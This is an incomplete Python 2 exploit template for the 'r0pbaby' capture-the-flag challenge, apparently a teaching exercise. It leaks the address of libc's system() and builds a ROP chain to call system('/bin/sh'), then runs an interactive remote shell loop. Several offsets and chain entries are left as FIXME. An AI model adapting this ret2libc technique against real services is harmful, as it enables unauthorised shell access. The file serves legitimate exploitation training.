#!/usr/bin/python

import struct
import socket
import time

# This function handle endianess.
# Stolen from De Eindbazen
def rop(*args):
    return struct.pack('Q'*len(args), *args)

host = "r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me"
port = 10436

host = "127.0.0.1"
port = 8888

system_offset = FIXME
rdi_gadget_offset = system_offset - FIXME
bin_sh_offset = system_offset - FIXME

import r2pipe
r = r2pipe.open('/lib/x86_64-linux-gnu/libc-2.23.so')  # put your libc here
bin_sh_offset = system_offset - int(r.cmd('iz~/bin/sh[3]'), 16)  # WHat does this line do?

s = socket.create_connection(('127.0.0.1', 8888))

s.send("2\n")
time.sleep(0.25)
s.recv(4096)

s.send("system\n")
time.sleep(0.25)
msg = s.recv(4096)
addr = msg[msg.find(':') + 2: msg.find('\n')]
system_addr = long(addr, 16)
print "[+] system addr: 0x%x" % system_addr

rdi_gadget_addr = system_addr - rdi_gadget_offset
print "[+] RDI gadget addr: 0x%x" % rdi_gadget_addr

bin_sh_addr = system_addr - bin_sh_offset
print "[+] \"/bin/sh\" addr: 0x%x" % bin_sh_addr

rop_buffer = 'A' * 8 + rop(
        FIXME
        FIXME,
        FIXME)

s.send("3\n")
time.sleep(0.25)

msg = s.recv(1024)
time.sleep(0.25)

rop_buffer_len = str(len(rop_buffer))
print "[*] sending payload..."
s.send(rop_buffer_len + "\n")
time.sleep(0.25)
s.send(rop_buffer + "\n")
time.sleep(0.25)
s.recv(2014)
time.sleep(0.25)

while(True):
    s.send(raw_input('$ ') + '\n')
    print(s.recv(1024))

